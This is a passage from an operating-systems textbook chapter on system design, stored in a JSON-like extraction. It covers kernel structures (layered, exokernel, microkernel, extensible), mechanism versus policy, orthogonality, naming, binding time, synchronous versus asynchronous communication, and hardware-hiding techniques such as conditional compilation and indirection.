...\r\nFile system 1 ... 6 File system m\r\n7 System call handler\r\nLayer\r\nDriver 2\r\nFigure 12-2. One possible design for a modern layered operating system.\r\nIn layer 4 we might find the device drivers, each one running as a separate\r\nthread, with its own state, program counter, registers, and so on, possibly (but not\r\nnecessarily) within the kernel address space. Such a design can greatly simplify the\r\nI/O structure because when an interrupt occurs, it can be converted into an unlock\r\non a mutex and a call to the scheduler to (potentially) schedule the newly readied\r\nthread that was blocked on the mutex. MINIX 3 uses this approach, but in UNIX,\r\nLinux, and Windows 8, the interrupt handlers run in a kind of no-man’s land, rather\r\nthan as proper threads like other threads that can be scheduled, suspended, and the\r\nlike. Since a huge amount of the complexity of any operating system is in the I/O,\r\nany technique for making it more tractable and encapsulated is worth considering.\r\nAbove layer 4, we would expect to find virtual memory, one or more file sys\u0002tems, and the system-call handlers. These layers are focused on providing services\r\nto applications. If the virtual memory is at a lower level than the file systems, then\r\nthe block cache can be paged out, allowing the virtual memory manager to dynam\u0002ically determine how the real memory should be divided among user pages and\r\nkernel pages, including the cache. Windows 8 works this way.\nSEC. 12.3 IMPLEMENTATION 995\r\nExokernels\r\nWhile layering has its supporters among system designers, another camp has\r\nprecisely the opposite view (Engler et al., 1995). Their view is based on the end\u0002to-end argument (Saltzer et al., 1984). This concept says that if something has to\r\nbe done by the user program itself, it is wasteful to do it in a lower layer as well.\r\nConsider an application of that principle to remote file access. If a system is\r\nworried about data being corrupted in transit, it should arrange for each file to be\r\nchecksummed at the time it is written and the checksum stored along with the file.\r\nWhen a file is transferred over a network from the source disk to the destination\r\nprocess, the checksum is transferred, too, and also recomputed at the receiving end.\r\nIf the two disagree, the file is discarded and transferred again.\r\nThis check is more accurate than using a reliable network protocol since it also\r\ncatches disk errors, memory errors, software errors in the routers, and other errors\r\nbesides bit transmission errors. The end-to-end argument says that using a reliable\r\nnetwork protocol is then not necessary, since the endpoint (the receiving process)\r\nhas enough information to verify the correctness of the file. The only reason for\r\nusing a reliable network protocol in this view is for efficiency, that is, catching and\r\nrepairing transmission errors earlier.\r\nThe end-to-end argument can be extended to almost all of the operating sys\u0002tem. It argues for not having the operating system do anything that the user pro\u0002gram can do itself. For example, why hav e a file system? Just let the user read and\r\nwrite a portion of the raw disk in a protected way. Of course, most users like hav\u0002ing files, but the end-to-end argument says that the file system should be a library\r\nprocedure linked with any program that needs to use files. This approach allows\r\ndifferent programs to have different file systems. This line of reasoning says that\r\nall the operating system should do is securely allocate resources (e.g., the CPU and\r\nthe disks) among the competing users. The Exokernel is an operating system built\r\naccording to the end-to-end argument (Engler et al., 1995).\r\nMicrokernel-Based Client-Server Systems\r\nA compromise between having the operating system do everything and the op\u0002erating system do nothing is to have the operating system do a little bit. This de\u0002sign leads to a microkernel with much of the operating system running as user\u0002level server processes, as illustrated in Fig. 12-3. This is the most modular and\r\nflexible of all the designs. The ultimate in flexibility is to have each device driver\r\nalso run as a user process, fully protected against the kernel and other drivers, but\r\nev en having the device drivers run in the kernel adds to the modularity.\r\nWhen the device drivers are in the kernel, they can access the hardware device\r\nregisters directly. When they are not, some mechanism is needed to provide access\r\nto them. If the hardware permits, each driver process could be given access to only\r\nthose I/O devices it needs. For example, with memory-mapped I/O, each driver\n996 OPERATING SYSTEM DESIGN CHAP. 12\r\nClient\r\nprocess\r\nClient\r\nprocess\r\nClient\r\nprocess\r\nProcess\r\nserver\r\nFile\r\nserver\r\nMemory\r\nserver\r\nMicrokernel\r\nUser mode\r\nKernel mode\r\nClient obtains\r\nservice by\r\nsending messages\r\nto server processes\r\nFigure 12-3. Client-server computing based on a microkernel.\r\nprocess could have the page for its device mapped in, but no other device pages. If\r\nthe I/O port space can be partially protected, the correct portion of it could be made\r\navailable to each driver.\r\nEven if no hardware assistance is available, the idea can still be made to work.\r\nWhat is then needed is a new system call, available only to device-driver processes,\r\nsupplying a list of (port, value) pairs. What the kernel does is first check to see if\r\nthe process owns all the ports in the list. If so, it then copies the corresponding val\u0002ues to the ports to initiate device I/O. A similar call can be used to read I/O ports.\r\nThis approach keeps device drivers from examining (and damaging) kernel\r\ndata structures, which is (for the most part) a good thing. An analogous set of calls\r\ncould be made available to allow driver processes to read and write kernel tables,\r\nbut only in a controlled way and with the approval of the kernel.\r\nThe main problem with this approach, and with microkernels in general, is the\r\nperformance hit all the extra context switches cause. However, virtually all work\r\non microkernels was done many years ago when CPUs were much slower. Now\u0002adays, applications that use every drop of CPU power and cannot tolerate a small\r\nloss of performance are few and far between. After all, when running a word proc\u0002essor or Web browser, the CPU is probably idle 95% of the time. If a microkernel\u0002based operating system turned an unreliable 3.5-GHz system into a reliable\r\n3.0-GHz system, probably few users would complain. Or even notice. After all,\r\nmost of them were quite happy only a few years ago when they got their previous\r\ncomputer at the then-stupendous speed of 1 GHz. Also, it is not clear whether the\r\ncost of interprocess communication is still as much of an issue if cores are no long\u0002er a scarce resource. If each device driver and each component of the operating\r\nsystem has its own dedicated core, there is no context switching during interproc\u0002ess communication. In addition, the caches, branch predictors and TLBs will be all\r\nwarmed up and ready to run at full speed. Some experimental work on a high-per\u0002formance operating system based on a microkernel was presented by Hruby et al.\r\n(2013).\r\nIt is noteworthy that while microkernels are not popular on the desktop, they\r\nare very widely used in cell phones, industrial systems, embedded systems, and\nSEC. 12.3 IMPLEMENTATION 997\r\nmilitary systems, where very high reliability is absolutely essential. Also, Apple’s\r\nOS X, which runs on all Macs and Macbooks, consists of a modified version of\r\nFreeBSD running on top of a modified version of the Mach microkernel.\r\nExtensible Systems\r\nWith the client-server systems discussed above, the idea was to remove as\r\nmuch out of the kernel as possible. The opposite approach is to put more modules\r\ninto the kernel, but in a protected way. The key word here is protected, of course.\r\nWe studied some protection mechanisms in Sec. 9.5.6 that were initially intended\r\nfor importing applets over the Internet, but are equally applicable to inserting for\u0002eign code into the kernel. The most important ones are sandboxing and code sign\u0002ing, as interpretation is not really practical for kernel code.\r\nOf course, an extensible system by itself is not a way to structure an operating\r\nsystem. However, by starting with a minimal system consisting of little more than a\r\nprotection mechanism and then adding protected modules to the kernel one at a\r\ntime until reaching the functionality desired, a minimal system can be built for the\r\napplication at hand. In this view, a new operating system can be tailored to each\r\napplication by including only the parts it requires. Paramecium is an example of\r\nsuch a system (Van Doorn, 2001).\r\nKernel Threads\r\nAnother issue relevant here no matter which structuring model is chosen is that\r\nof system threads. It is sometimes convenient to allow kernel threads to exist, sep\u0002arate from any user process. These threads can run in the background, writing dirty\r\npages to disk, swapping processes between main memory and disk, and so forth.\r\nIn fact, the kernel itself can be structured entirely of such threads, so that when a\r\nuser does a system call, instead of the user’s thread executing in kernel mode, the\r\nuser’s thread blocks and passes control to a kernel thread that takes over to do the\r\nwork.\r\nIn addition to kernel threads running in the background, most operating sys\u0002tems start up many daemon processes in the background. While these are not part\r\nof the operating system, they often perform ‘‘system’’ type activities. These might\r\nincluding getting and sending email and serving various kinds of requests for re\u0002mote users, such as FTP and Web pages."
          },
          "12.3.2 Mechanism vs. Policy": {
            "page": 1028,
            "content": "12.3.2 Mechanism vs. Policy\r\nAnother principle that helps architectural coherence, along with keeping things\r\nsmall and well structured, is that of separating mechanism from policy. By putting\r\nthe mechanism in the operating system and leaving the policy to user processes,\r\nthe system itself can be left unmodified, even if there is a need to change policy.\n998 OPERATING SYSTEM DESIGN CHAP. 12\r\nEven if the policy module has to be kept in the kernel, it should be isolated from\r\nthe mechanism, if possible, so that changes in the policy module do not affect the\r\nmechanism module.\r\nTo make the split between policy and mechanism clearer, let us consider two\r\nreal-world examples. As a first example, consider a large company that has a pay\u0002roll department, which is in charge of paying the employees’ salaries. It has com\u0002puters, software, blank checks, agreements with banks, and more mechanisms for\r\nactually paying out the salaries. However, the policy—determining who gets paid\r\nhow much—is completely separate and is decided by management. The payroll de\u0002partment just does what it is told to do.\r\nAs the second example, consider a restaurant. It has the mechanism for serv\u0002ing diners, including tables, plates, waiters, a kitchen full of equipment, agree\u0002ments with food suppliers and credit card companies, and so on. The policy is set\r\nby the chef, namely, what is on the menu. If the chef decides that tofu is out and\r\nbig steaks are in, this new policy can be handled by the existing mechanism.\r\nNow let us consider some operating system examples. First, let us consider\r\nthread scheduling. The kernel could have a priority scheduler, with k priority lev\u0002els. The mechanism is an array, indexed by priority level, as is the case in UNIX\r\nand Windows 8. Each entry is the head of a list of ready threads at that priority\r\nlevel. The scheduler just searches the array from highest priority to lowest priority,\r\nselecting the first threads it hits. The policy is setting the priorities. The system\r\nmay have different classes of users, each with a different priority, for example. It\r\nmight also allow user processes to set the relative priority of its threads. Priorities\r\nmight be increased after completing I/O or decreased after using up a quantum.\r\nThere are numerous other policies that could be followed, but the idea here is the\r\nseparation between setting policy and carrying it out.\r\nA second example is paging. The mechanism involves MMU management,\r\nkeeping lists of occupied and free pages, and code for shuttling pages to and from\r\ndisk. The policy is deciding what to do when a page fault occurs. It could be local\r\nor global, LRU-based or FIFO-based, or something else, but this algorithm can\r\n(and should) be completely separate from the mechanics of managing the pages.\r\nA third example is allowing modules to be loaded into the kernel. The mechan\u0002ism concerns how they are inserted, how they are linked, what calls they can make,\r\nand what calls can be made on them. The policy is determining who is allowed to\r\nload a module into the kernel and which modules. Maybe only the superuser can\r\nload modules, but maybe any user can load a module that has been digitally signed\r\nby the appropriate authority."
          },
          "12.3.3 Orthogonality": {
            "page": 1029,
            "content": "12.3.3 Orthogonality\r\nGood system design consists of separate concepts that can be combined inde\u0002pendently. For example, in C there are primitive data types including integers,\r\ncharacters, and floating-point numbers. There are also mechanisms for combining\nSEC. 12.3 IMPLEMENTATION 999\r\ndata types, including arrays, structures, and unions. These ideas combine indepen\u0002dently, allowing arrays of integers, arrays of characters, structures and union mem\u0002bers that are floating-point numbers, and so forth. In fact, once a new data type has\r\nbeen defined, such as an array of integers, it can be used as if it were a primitive\r\ndata type, for example as a member of a structure or a union. The ability to com\u0002bine separate concepts independently is called orthogonality. It is a direct conse\u0002quence of the simplicity and completeness principles.\r\nThe concept of orthogonality also occurs in operating systems in various dis\u0002guises. One example is the Linux clone system call, which creates a new thread.\r\nThe call has a bitmap as a parameter, which allows the address space, working di\u0002rectory, file descriptors, and signals to be shared or copied individually. If every\u0002thing is copied, we have a new process, the same as fork. If nothing is copied, a\r\nnew thread is created in the current process. However, it is also possible to create\r\nintermediate forms of sharing not possible in traditional UNIX systems. By sepa\u0002rating out the various features and making them orthogonal, a finer degree of con\u0002trol is possible.\r\nAnother use of orthogonality is the separation of the process concept from the\r\nthread concept in Windows 8. A process is a container for resources, nothing more\r\nand nothing less. A thread is a schedulable entity. When one process is given a\r\nhandle for another process, it does not matter how many threads it has. When a\r\nthread is scheduled, it does not matter which process it belongs to. These concepts\r\nare orthogonal.\r\nOur last example of orthogonality comes from UNIX. Process creation there is\r\ndone in two steps: fork plus exec. Creating the new address space and loading it\r\nwith a new memory image are separate, allowing things to be done in between\r\n(such as manipulating file descriptors). In Windows 8, these two steps cannot be\r\nseparated, that is, the concepts of making a new address space and filling it in are\r\nnot orthogonal there. The Linux sequence of clone plus exec is yet more orthogo\u0002nal, since even more fine-grained building blocks are available. As a general rule,\r\nhaving a small number of orthogonal elements that can be combined in many ways\r\nleads to a small, simple, and elegant system."
          },
          "12.3.4 Naming": {
            "page": 1030,
            "content": "12.3.4 Naming\r\nMost long-lived data structures used by an operating system have some kind of\r\nname or identifier by which they can be referred to. Obvious examples are login\r\nnames, file names, device names, process IDs, and so on. How these names are\r\nconstructed and managed is an important issue in system design and imple\u0002mentation.\r\nNames that were primarily designed for human beings to use are charac\u0002ter-string names in ASCII or Unicode and are usually hierarchical. Directory paths,\r\nsuch as /usr/ast/books/mos4/chap-12, are clearly hierarchical, indicating a series of\r\ndirectories to search starting at the root. URLs are also hierarchical. For example,\n1000 OPERATING SYSTEM DESIGN CHAP. 12\r\nwww.cs.vu.nl/~ast/ indicates a specific machine (www) in a specific department\r\n(cs) at specific university (vu) in a specific country (nl). The part after the slash in\u0002dicates a specific file on the designated machine, in this case, by convention,\r\nwww/index.html in ast’s home directory. Note that URLs (and DNS addresses in\r\ngeneral, including email addresses) are ‘‘backward,’’ starting at the bottom of the\r\ntree and going up, unlike file names, which start at the top of the tree and go down.\r\nAnother way of looking at this is whether the tree is written from the top starting at\r\nthe left and going right or starting at the right and going left.\r\nOften naming is done at two lev els: external and internal. For example, files al\u0002ways have a character-string name in ASCII or Unicode for people to use. In addi\u0002tion, there is almost always an internal name that the system uses. In UNIX, the\r\nreal name of a file is its i-node number; the ASCII name is not used at all inter\u0002nally. In fact, it is not even unique, since a file may have multiple links to it. The\r\nanalogous internal name in Windows 8 is the file’s index in the MFT. The job of\r\nthe directory is to provide the mapping between the external name and the internal\r\nname, as shown in Fig. 12-4.\r\nChap-12\r\nChap-11\r\nChap-10\r\nExternal name: /usr/ast/books/mos2/Chap-12\r\nDirectory: /usr/ast/books/mos2 I-node table\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7\r\n2\r\n38\r\n114\r\nInternal name: 2\r\nFigure 12-4. Directories are used to map external names onto internal names.\r\nIn many cases (such as the file-name example given above), the internal name\r\nis an unsigned integer that serves as an index into a kernel table. Other examples of\r\ntable-index names are file descriptors in UNIX and object handles in Windows 8.\r\nNote that neither of these has any external representation. They are strictly for use\r\nby the system and running processes. In general, using table indices for transient\r\nnames that are lost when the system is rebooted is a good idea.\r\nOperating systems commonly support multiple namespaces, both external and\r\ninternal. For example, in Chap. 11 we looked at three external namespaces sup\u0002ported by Windows 8: file names, object names, and registry names (and there is\r\nalso the Active Directory namespace, which we did not look at). In addition, there\r\nare innumerable internal namespaces using unsigned integers, for example, object\nSEC. 12.3 IMPLEMENTATION 1001\r\nhandles and MFT entries. Although the names in the external namespaces are all\r\nUnicode strings, looking up a file name in the registry will not work, just as using\r\nan MFT index in the object table will not work. In a good design, considerable\r\nthought is given to how many namespaces are needed, what the syntax of names is\r\nin each one, how they can be told apart, whether absolute and relative names exist,\r\nand so on."
          },
          "12.3.5 Binding": {
            "page": 1032,
            "content": "12.3.5 Binding Time\r\nAs we have just seen, operating systems use various kinds of names to refer to\r\nobjects. Sometimes the mapping between a name and an object is fixed, but some\u0002times it is not. In the latter case, when the name is bound to the object may matter.\r\nIn general, early binding is simple, but not flexible, whereas late binding is more\r\ncomplicated but often more flexible.\r\nTo clarify the concept of binding time, let us look at some real-world ex\u0002amples. An example of early binding is the practice of some colleges to allow par\u0002ents to enroll a baby at birth and prepay the current tuition. When the student\r\nshows up 18 years later, the tuition is fully paid, no matter how high it may be at\r\nthat moment.\r\nIn manufacturing, ordering parts in advance and maintaining an inventory of\r\nthem is early binding. In contrast, just-in-time manufacturing requires suppliers to\r\nbe able to provide parts on the spot, with no advance notice required. This is late\r\nbinding.\r\nProgramming languages often support multiple binding times for variables.\r\nGlobal variables are bound to a particular virtual address by the compiler. This\r\nexemplifies early binding. Variables local to a procedure are assigned a virtual ad\u0002dress (on the stack) at the time the procedure is invoked. This is intermediate bind\u0002ing. Variables stored on the heap (those allocated by malloc in C or new in Java)\r\nare assigned virtual addresses only at the time they are actually used. Here we have\r\nlate binding.\r\nOperating systems often use early binding for most data structures, but occa\u0002sionally use late binding for flexibility. Memory allocation is a case in point. Early\r\nmultiprogramming systems on machines lacking address-relocation hardware had\r\nto load a program at some memory address and relocate it to run there. If it was\r\nev er swapped out, it had to be brought back at the same memory address or it\r\nwould fail. In contrast, paged virtual memory is a form of late binding. The actual\r\nphysical address corresponding to a given virtual address is not known until the\r\npage is touched and actually brought into memory.\r\nAnother example of late binding is window placement in a GUI. In contrast to\r\nthe early graphical systems, in which the programmer had to specify the absolute\r\nscreen coordinates for all images on the screen, in modern GUIs the software uses\r\ncoordinates relative to the window’s origin, but that is not determined until the\r\nwindow is put on the screen, and it may even be changed later.\n1002 OPERATING SYSTEM DESIGN CHAP. 12"
          },
          "12.3.6 Static vs. Dynamic Structures": {
            "page": 1033,
            "content": "12.3.6 Static vs. Dynamic Structures\r\nOperating system designers are constantly forced to choose between static and\r\ndynamic data structures. Static ones are always simpler to understand, easier to\r\nprogram, and faster in use; dynamic ones are more flexible. An obvious example\r\nis the process table. Early systems simply allocated a fixed array of per-process\r\nstructures. If the process table consisted of 256 entries, then only 256 processes\r\ncould exist at any one instant. An attempt to create a 257th one would fail for lack\r\nof table space. Similar considerations held for the table of open files (both per user\r\nand systemwide), and many other kernel tables.\r\nAn alternative strategy is to build the process table as a linked list of minita\u0002bles, initially just one. If this table fills up, another one is allocated from a global\r\nstorage pool and linked to the first one. In this way, the process table cannot fill up\r\nuntil all of kernel memory is exhausted.\r\nOn the other hand, the code for searching the table becomes more complicated.\r\nFor example, the code for searching a static process table for a given PID, pid, is\r\ngiven in Fig. 12-5. It is simple and efficient. Doing the same thing for a linked list\r\nof minitables is more work.\r\nfound = 0;\r\nfor (p = &proc table[0]; p < &proc table[PROC TABLE SIZE]; p++) {\r\nif (p->proc pid == pid) {\r\nfound = 1;\r\nbreak;\r\n}\r\n}\r\nFigure 12-5. Code for searching the process table for a given PID.\r\nStatic tables are best when there is plenty of memory or table utilizations can\r\nbe guessed fairly accurately. For example, in a single-user system, it is unlikely\r\nthat the user will start up more than 128 processes at once, and it is not a total dis\u0002aster if an attempt to start a 129th one fails.\r\nYet another alternative is to use a fixed-size table, but if it fills up, allocate a\r\nnew fixed-size table, say, twice as big. The current entries are then copied over to\r\nthe new table and the old table is returned to the free storage pool. In this way, the\r\ntable is always contiguous rather than linked. The disadvantage here is that some\r\nstorage management is needed and the address of the table is now a variable in\u0002stead of a constant.\r\nA similar issue holds for kernel stacks. When a thread switches from user\r\nmode to kernel mode, or a kernel-mode thread is run, it needs a stack in kernel\r\nspace. For user threads, the stack can be initialized to run down from the top of the\r\nvirtual address space, so the size need not be specified in advance. For kernel\r\nthreads, the size must be specified in advance because the stack takes up some ker\u0002nel virtual address space and there may be many stacks. The question is: how much\nSEC. 12.3 IMPLEMENTATION 1003\r\nspace should each one get? The trade-offs here are similar to those for the process\r\ntable. Making key data structures like these dynamic is possible, but complicated.\r\nAnother static-dynamic trade-off is process scheduling. In some systems, es\u0002pecially real-time ones, the scheduling can be done statically in advance. For ex\u0002ample, an airline knows what time its flights will leave weeks before their depar\u0002ture. Similarly, multimedia systems know when to schedule audio, video, and other\r\nprocesses in advance. For general-purpose use, these considerations do not hold\r\nand scheduling must be dynamic.\r\nYet another static-dynamic issue is kernel structure. It is much simpler if the\r\nkernel is built as a single binary program and loaded into memory to run. The\r\nconsequence of this design, however, is that adding a new I/O device requires a\r\nrelinking of the kernel with the new device driver. Early versions of UNIX worked\r\nthis way, and it was quite satisfactory in a minicomputer environment when adding\r\nnew I/O devices was a rare occurrence. Nowadays, most operating systems allow\r\ncode to be added to the kernel dynamically, with all the additional complexity that\r\nentails."
          },
          "12.3.7 Top-Down vs. Bottom-Up Implementation": {
            "page": 1034,
            "content": "12.3.7 Top-Down vs. Bottom-Up Implementation\r\nWhile it is best to design the system top down, in theory it can be implemented\r\ntop down or bottom up. In a top-down implementation, the implementers start\r\nwith the system-call handlers and see what mechanisms and data structures are\r\nneeded to support them. These procedures are written, and so on, until the hard\u0002ware is reached.\r\nThe problem with this approach is that it is hard to test anything with only the\r\ntop-level procedures available. For this reason, many dev elopers find it more prac\u0002tical to actually build the system bottom up. This approach entails first writing\r\ncode that hides the low-level hardware, essentially the HAL in Fig. 11-4. Interrupt\r\nhandling and the clock driver are also needed early on.\r\nThen multiprogramming can be tackled, along with a simple scheduler (e.g.,\r\nround-robin scheduling). At this point it should be possible to test the system to\r\nsee if it can run multiple processes correctly. If that works, it is now time to begin\r\nthe careful definition of the various tables and data structures needed throughout\r\nthe system, especially those for process and thread management and later memory\r\nmanagement. I/O and the file system can wait initially, except for a primitive way\r\nto read the keyboard and write to the screen for testing and debugging. In some\r\ncases, the key low-level data structures should be protected by allowing access\r\nonly through specific access procedures—in effect, object-oriented programming,\r\nno matter what the programming language is. As lower layers are completed, they\r\ncan be tested thoroughly. In this way, the system advances from the bottom up,\r\nmuch the way contractors build tall office buildings.\r\nIf a large team of programmers is available, an alternative approach is to first\r\nmake a detailed design of the whole system, and then assign different groups to\n1004 OPERATING SYSTEM DESIGN CHAP. 12\r\nwrite different modules. Each one tests its own work in isolation. When all the\r\npieces are ready, they are integrated and tested. The problem with this line of at\u0002tack is that if nothing works initially, it may be hard to isolate whether one or more\r\nmodules are malfunctioning, or one group misunderstood what some other module\r\nwas supposed to do. Nevertheless, with large teams, this approach is often used to\r\nmaximize the amount of parallelism in the programming effort."
          },
          "12.3.8 Synchronous vs. Asynchronous Communication": {
            "page": 1035,
            "content": "12.3.8 Synchronous vs. Asynchronous Communication\r\nAnother issue that often creeps up in conversations between operating system\r\ndesigners is whether the interactions between the system components should be\r\nsynchronous or asynchronous (and, related, whether threads are better than events).\r\nThe issue frequently leads to heated arguments between proponents of the two\r\ncamps, although it does not leave them foaming at the mouth quite as much as\r\nwhen deciding really important matters—like which is the best editor, vi or emacs.\r\nWe use the term ‘‘synchronous’’ in the (loose) sense of Sec. 8.2 to denote calls that\r\nblock until completion. Conversely, with ‘‘asynchronous’’ calls the caller keeps\r\nrunning. There are advantages and disadvantages to either model.\r\nSome systems, like Amoeba, really embrace the synchronous design and im\u0002plement communication between processes as blocking client-server calls. Fully\r\nsynchronous communication is conceptually very simple. A process sends a re\u0002quest and blocks waiting until the reply arrives—what could be simpler? It be\u0002comes a little more complicated when there are many clients all crying for the ser\u0002ver’s attention. Each individual request may block for a long time waiting for other\r\nrequests to complete first. This can be solved by making the server multi-threaded\r\nso that each thread can handle one client. The model is tried and tested in many\r\nreal-world implementations, in operating systems as well as user applications.\r\nThings get more complicated still if the threads frequently read and write shar\u0002ed data structures. In that case, locking is unavoidable. Unfortunately, getting the\r\nlocks right is not easy. The simplest solution is to throw a single big lock on all\r\nshared data structures (similar to the big kernel lock). Whenever a thread wants to\r\naccess the shared data structures, it has to grab the lock first. For performance rea\u0002sons, a single big lock is a bad idea, because threads end up waiting for each other\r\nall the time even if they do not conflict at all. The other extreme, lots of micro\r\nlocks for (parts) of individual data structures, is much faster, but conflicts with our\r\nguiding principle number one: simplicity.\r\nOther operating systems build their interprocess communication using asyn\u0002chronous primitives. In a way, asynchronous communication is even simpler than\r\nits synchronous cousin. A client process sends a message to a server, but rather\r\nthan wait for the message to be delivered or a reply to be sent back, it just con\u0002tinues executing. Of course, this means that it also receives the reply asynchro\u0002nously and should remember which request corresponded to it when it arrives. The\r\nserver typically processes the requests (events) as a single thread in an event loop.\nSEC. 12.3 IMPLEMENTATION 1005\r\nWhenever the request requires the server to contact other servers for further proc\u0002essing it sends an asynchronous message of its own and, rather than block, con\u0002tinues with the next request. Multiple threads are not needed. With only a single\r\nthread processing events, the problem of multiple threads accessing shared data\r\nstructures cannot occur. On the other hand, a long-running event handler makes the\r\nsingle-threaded server’s response sluggish.\r\nWhether threads or events are the better programming model is a long-standing\r\ncontroversial issue that has stirred the hearts of zealots on either side ever since\r\nJohn Ousterhout’s classic paper: ‘‘Why threads are a bad idea (for most purposes)’’\r\n(1996). Ousterhout argues that threads make everything needlessly complicated:\r\nlocking, debugging, callbacks, performance—you name it. Of course, it would not\r\nbe a controversy if everybody agreed. A few years after Ousterhout’s paper, Von\r\nBehren et al. (2003) published a paper titled ‘‘Why events are a bad idea (for high\u0002concurrency servers).’’ Thus, deciding on the right programming model is a hard,\r\nbut important decision for system designers. There is no slam-dunk winner. Web\r\nservers like apache firmly embrace synchronous communication and threads, but\r\nothers like lighttpd are based on the ev ent-driven paradigm. Both are very popu\u0002lar. In our opinion, events are often easier to understand and debug than threads. As\r\nlong as there is no need for per-core concurrency, they are probably a good choice."
          },
          "12.3.9 Useful Techniques": {
            "page": 1036,
            "content": "12.3.9 Useful Techniques\r\nWe hav e just looked at some abstract ideas for system design and imple\u0002mentation. Now we will examine a number of useful concrete techniques for sys\u0002tem implementation. There are numerous others, of course, but space limitations\r\nrestrict us to just a few.\r\nHiding the Hardware\r\nA lot of hardware is ugly. It has to be hidden early on (unless it exposes pow\u0002er, which most hardware does not). Some of the very low-level details can be hid\u0002den by a HAL-type layer of the type shown in Fig. 12-2 as layer 1. However,\r\nmany hardware details cannot be hidden this way.\r\nOne thing that deserves early attention is how to deal with interrupts. They\r\nmake programming unpleasant, but operating systems have to deal with them. One\r\napproach is to turn them into something else immediately. For example, every in\u0002terrupt could be turned into a pop-up thread instantly. At that point we are dealing\r\nwith threads, rather than interrupts.\r\nA second approach is to convert each interrupt into an unlock operation on a\r\nmutex that the corresponding driver is waiting on. Then the only effect of an inter\u0002rupt is to cause some thread to become ready.\n1006 OPERATING SYSTEM DESIGN CHAP. 12\r\nA third approach is to immediately convert an interrupt into a message to some\r\nthread. The low-level code just builds a message telling where the interrupt came\r\nfrom, enqueues it, and calls the scheduler to (potentially) run the handler, which\r\nwas probably blocked waiting for the message. All these techniques, and others\r\nlike them, all try to convert interrupts into thread-synchronization operations. Hav\u0002ing each interrupt handled by a proper thread in a proper context is easier to man\u0002age than running a handler in the arbitrary context that it happened to occur in. Of\r\ncourse, this must be done efficiently, but deep within the operating system, every\u0002thing must be done efficiently.\r\nMost operating systems are designed to run on multiple hardware platforms.\r\nThese platforms can differ in terms of the CPU chip, MMU, word length, RAM\r\nsize, and other features that cannot easily be masked by the HAL or equivalent.\r\nNevertheless, it is highly desirable to have a single set of source files that are used\r\nto generate all versions; otherwise each bug that later turns up must be fixed multi\u0002ple times in multiple sources, with the danger that the sources drift apart.\r\nSome hardware differences, such as RAM size, can be dealt with by having the\r\noperating system determine the value at boot time and keep it in a variable. Memo\u0002ry allocators, for example, can use the RAM-size variable to determine how big to\r\nmake the block cache, page tables, and the like. Even static tables such as the proc\u0002ess table can be sized based on the total memory available.\r\nHowever, other differences, such as different CPU chips, cannot be solved by\r\nhaving a single binary that determines at run time which CPU it is running on. One\r\nway to tackle the problem of one source and multiple targets is to use conditional\r\ncompilation. In the source files, certain compile-time flags are defined for the dif\u0002ferent configurations and these are used to bracket code that is dependent on the\r\nCPU, word length, MMU, and so on. For example, imagine an operating system\r\nthat is to run on the IA32 line of x86 chips (sometimes referred to as x86-32), or\r\non UltraSPARC chips, which need different initialization code. The init procedure\r\ncould be written as illustrated in Fig. 12-6(a). Depending on the value of CPU,\r\nwhich is defined in the header file config.h, one kind of initialization or other is\r\ndone. Because the actual binary contains only the code needed for the target ma\u0002chine, there is no loss of efficiency this way.\r\nAs a second example, suppose there is a need for a data type Register, which\r\nshould be 32 bits on the IA32 and 64 bits on the UltraSPARC. This could be hand\u0002led by the conditional code of Fig. 12-6(b) (assuming that the compiler produces\r\n32-bit ints and 64-bit longs). Once this definition has been made (probably in a\r\nheader file included everywhere), the programmer can just declare variables to be\r\nof type Register and know they will be the right length.\r\nThe header file, config.h, has to be defined correctly, of course. For the IA32 it\r\nmight be something like this:\r\n#define CPU IA32\r\n#define WORD LENGTH 32\nSEC. 12.3 IMPLEMENTATION 1007\r\n#include \"config.h\" #include \"config.h\"\r\ninit( ) #if (WORD LENGTH == 32)\r\n{ typedef int Register;\r\n#if (CPU == IA32) #endif\r\n/\r\n* IA32 initialization here. */\r\n#endif #if (WORD LENGTH == 64)\r\ntypedef long Register;\r\n#if (CPU == ULTRASPARC) #endif\r\n/\r\n* UltraSPARC initialization here. */\r\n#endif Register R0, R1, R2, R3;\r\n(a) (b)\r\n}\r\nFigure 12-6. (a) CPU-dependent conditional compilation. (b) Word-length-de\u0002pendent conditional compilation.\r\nTo compile the system for the UltraSPARC, a different config.h would be used,\r\nwith the correct values for the UltraSPARC, probably something like\r\n#define CPU ULTRASPARC\r\n#define WORD LENGTH 64\r\nSome readers may be wondering why CPU and WORD LENGTH are handled\r\nby different macros. We could easily have bracketed the definition of Register\r\nwith a test on CPU, setting it to 32 bits for the IA32 and 64 bits for the Ultra\u0002SPARC. However, this is not a good idea. Consider what happens when we later\r\nport the system to the 32-bit ARM. We would have to add a third conditional to\r\nFig. 12-6(b) for the ARM. By doing it as we have, all we have to do is include the\r\nline\r\n#define WORD LENGTH 32\r\nto the config.h file for the ARM.\r\nThis example illustrates the orthogonality principle we discussed earlier. Those\r\nitems that are CPU dependent should be conditionally compiled based on the CPU\r\nmacro, and those that are word-length dependent should use the WORD LENGTH\r\nmacro. Similar considerations hold for many other parameters.\r\nIndirection\r\nIt is sometimes said that there is no problem in computer science that cannot\r\nbe solved with another level of indirection. While something of an exaggeration,\r\nthere is definitely a grain of truth here. Let us consider some examples. On\r\nx86-based systems, when a key is depressed, the hardware generates an interrupt\r\nand puts the key number, rather than an ASCII character code, in a device register.\n1008 OPERATING SYSTEM DESIGN CHAP. 12\r\nFurthermore, when the key is released later, a second interrupt is generated, also\r\nwith the key number. This indirection allows the operating system the possibility of\r\nusing the key number to index into a table to get the ASCII character, which makes\r\nit easy to handle the many keyboards used around the world in different countries.\r\nGetting both the depress and release information makes it possible to use any key\r\nas a shift key, since the operating system knows the exact sequence in which the\r\nkeys were depressed and released.\r\nIndirection is also used on output. Programs can write ASCII characters to the\r\nscreen, but these are interpreted as indices into a table for the current output font.\r\nThe table entry contains the bitmap for the character. This indirection makes it\r\npossible to separate characters from fonts.\r\nAnother example of indirection is the use of major device numbers in UNIX.\r\nWithin the kernel there is a table indexed by major device number for the block de\u0002vices and another one for the character devices. When a process opens a special\r\nfile such as /dev/hd0, the system extracts the type (block or character) and major\r\nand minor device numbers from the i-node and indexes into the appropriate driver\r\ntable to find the driver. This indirection makes it easy to reconfigure the system,\r\nbecause programs deal with symbolic device names, not actual driver names.\r\nYet another example of indirection occurs in message-passing systems that\r\nname a mailbox rather than a process as the message destination. By indirecting\r\nthrough mailboxes (as opposed to naming a process as the destination), consid\u0002erable flexibility can be achieved (e.g., having a secretary 